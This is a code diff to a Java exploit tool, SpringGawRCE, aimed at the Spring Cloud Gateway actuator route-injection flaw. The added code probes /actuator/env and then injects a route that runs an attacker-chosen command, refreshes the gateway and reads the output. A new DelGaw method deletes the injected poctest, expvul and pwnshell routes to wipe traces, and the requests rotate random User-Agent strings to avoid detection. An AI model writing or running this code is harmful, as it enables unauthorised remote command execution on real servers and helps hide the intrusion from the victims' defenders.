@@ -74,49 +74,70 @@ public class SpringGawRCE {
         String res = "";
         String ua = "";
         String text = "";
-        if (command == null) {
-            api = "/actuator/gateway/routes/poctest";
-            data = pocData;
-        }else{
-            api = "/actuator/gateway/routes/expvul";
-            data = constructExpData(command);
-        }
-        String refapi = "/actuator/gateway/refresh";
-        String site = address + api;
+        String refapi = "";
         disableSSLVerification();
+        URL obj = new URL(address + "/actuator/env");
+        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+        UA_Config uacf = new UA_Config();
+        List<String> ualist = uacf.loadUserAgents();
+        ua = uacf.getRandomUserAgent(ualist);
+        conn.setRequestProperty("User-Agent",ua);
+        conn.setRequestMethod("GET");
+        conn.setDoOutput(true);
+        int responseCode = conn.getResponseCode();
+        if (responseCode == HttpURLConnection.HTTP_OK){
+            if (command == null) {
+                api = "/actuator/gateway/routes/poctest";
+                refapi = "/actuator/gateway/refresh";
+                data = pocData;
+            }else{
+                api = "/actuator/gateway/routes/expvul";
+                refapi = "/actuator/gateway/refresh";
+                data = constructExpData(command);
+            }
+        }else {
+            if (command == null) {
+                api = "/gateway/routes/poctest";
+                refapi = "/gateway/refresh";
+                data = pocData;
+            }else{
+                api = "/gateway/routes/expvul";
+                refapi = "/gateway/refresh";
+                data = constructExpData(command);
+            }
+        }
+        String site = address + api;
         try {
-            URL urlobj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) urlobj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
+            URL obj1 = new URL(site);
+            HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
             ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "application/json");
-            conn.setDoOutput(true);
-            try (OutputStream os = conn.getOutputStream()) {
+            conn1.setRequestProperty("User-Agent",ua);
+            conn1.setRequestMethod("POST");
+            conn1.setRequestProperty("Content-Type", "application/json");
+            conn1.setDoOutput(true);
+            try (OutputStream os = conn1.getOutputStream()) {
                 byte[] input = data.getBytes(StandardCharsets.UTF_8);
                 os.write(input, 0, input.length);
             }
-            int responseCode = conn.getResponseCode();
-            if (responseCode == HttpURLConnection.HTTP_CREATED) {
+            int responseCode1 = conn1.getResponseCode();
+            if (responseCode1 == HttpURLConnection.HTTP_CREATED) {
                 String site1 = address + refapi;
-                URL urlobj1 = new URL(site1);
-                HttpURLConnection conn1 = (HttpURLConnection) urlobj1.openConnection();
+                URL obj2 = new URL(site1);
+                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                 ua = uacf.getRandomUserAgent(ualist);
-                conn1.setRequestProperty("User-Agent",ua);
-                conn1.setRequestMethod("POST");
-                conn1.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-                conn1.setDoOutput(true);
-                int responseCode1 = conn1.getResponseCode();
-                if (responseCode1 == HttpURLConnection.HTTP_OK) {
-                    URL urlobj2 = new URL(site);
-                    HttpURLConnection conn2 = (HttpURLConnection) urlobj2.openConnection();
+                conn2.setRequestProperty("User-Agent",ua);
+                conn2.setRequestMethod("POST");
+                conn2.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                conn2.setDoOutput(true);
+                int responseCode2 = conn2.getResponseCode();
+                if (responseCode2 == HttpURLConnection.HTTP_OK) {
+                    URL obj3 = new URL(site);
+                    HttpURLConnection conn3 = (HttpURLConnection) obj3.openConnection();
                     ua = uacf.getRandomUserAgent(ualist);
-                    conn2.setRequestProperty("User-Agent",ua);
-                    conn2.setRequestMethod("GET");
-                    conn2.setDoOutput(true);
-                    BufferedReader in = new BufferedReader(new InputStreamReader(conn2.getInputStream()));
+                    conn3.setRequestProperty("User-Agent",ua);
+                    conn3.setRequestMethod("GET");
+                    conn3.setDoOutput(true);
+                    BufferedReader in = new BufferedReader(new InputStreamReader(conn3.getInputStream()));
                     String inputLine;
                     StringBuilder content = new StringBuilder();
                     while ((inputLine = in.readLine()) != null) {
@@ -124,8 +145,8 @@ public class SpringGawRCE {
                         res = inputLine;
                     }
                     in.close();
-                    int responseCode2 = conn2.getResponseCode();
-                    if (responseCode2 == HttpURLConnection.HTTP_OK) {
+                    int responseCode3 = conn3.getResponseCode();
+                    if (responseCode3 == HttpURLConnection.HTTP_OK) {
                         if (!res.contains("poctest")) {
                             String resultPattern = "Result\\s*=\\s*'([^\\n]*)'";
                             Pattern pattern = Pattern.compile(resultPattern);
@@ -156,4 +177,87 @@ public class SpringGawRCE {
             e.printStackTrace();
         }
     }
+
+    public void DelGaw(ResultCallback callback) throws IOException{
+        String api = "";
+        String api1 = "";
+        String res = "";
+        String ua = "";
+        String expapi = "";
+        String text = "";
+        String refapi = "";
+        disableSSLVerification();
+        URL obj = new URL(address + "/actuator/env");
+        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+        UA_Config uacf = new UA_Config();
+        List<String> ualist = uacf.loadUserAgents();
+        ua = uacf.getRandomUserAgent(ualist);
+        conn.setRequestProperty("User-Agent",ua);
+        conn.setRequestMethod("GET");
+        conn.setDoOutput(true);
+        int responseCode = conn.getResponseCode();
+        if (responseCode == HttpURLConnection.HTTP_OK){
+                api = "/actuator/gateway/routes/poctest";
+                refapi = "/actuator/gateway/refresh";
+                api1 = "/actuator/gateway/routes/expvul";
+                expapi = "/actuator/gateway/routes/pwnshell";
+        }else {
+            api = "/gateway/routes/poctest";
+            refapi = "/gateway/refresh";
+            api1 = "/gateway/routes/expvul";
+            expapi = "/gateway/routes/pwnshell";
+        }
+        String site = address + api;
+        String site1 = address + api1;
+        String site2 = address + expapi;
+        try {
+            URL obj1 = new URL(site);
+            HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn1.setRequestProperty("User-Agent",ua);
+            conn1.setRequestMethod("DELETE");
+            conn1.setDoOutput(true);
+            int responseCode1 = conn1.getResponseCode();
+            URL obj2 = new URL(site1);
+            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn2.setRequestProperty("User-Agent",ua);
+            conn2.setRequestMethod("DELETE");
+            conn2.setDoOutput(true);
+            int responseCode2 = conn2.getResponseCode();
+            URL obj3 = new URL(site2);
+            HttpURLConnection conn3 = (HttpURLConnection) obj3.openConnection();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn3.setRequestProperty("User-Agent",ua);
+            conn3.setRequestMethod("DELETE");
+            conn3.setDoOutput(true);
+            int responseCode3 = conn3.getResponseCode();
+            if (responseCode1 == HttpURLConnection.HTTP_OK || responseCode2 == HttpURLConnection.HTTP_OK || responseCode3 == HttpURLConnection.HTTP_OK) {
+                String refsite = address + refapi;
+                URL refobj = new URL(refsite);
+                HttpURLConnection refconn = (HttpURLConnection) refobj.openConnection();
+                ua = uacf.getRandomUserAgent(ualist);
+                refconn.setRequestProperty("User-Agent",ua);
+                refconn.setRequestMethod("POST");
+                refconn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                refconn.setDoOutput(true);
+                int refcode = refconn.getResponseCode();
+                if (refcode == HttpURLConnection.HTTP_OK) {
+                    text = "痕迹清除成功";
+                    callback.onResult(text);
+                } else{
+                    text = "POST request failed with response code: " + responseCode1;
+                    callback.onResult(text);
+                }
+            }else{
+                text = "无法删除路由";
+                callback.onResult(text);
+            }
+        }catch (Exception e){
+            text = "发起请求异常";
+            callback.onResult(text);
+            e.printStackTrace();
+        }
+    }
 }
+
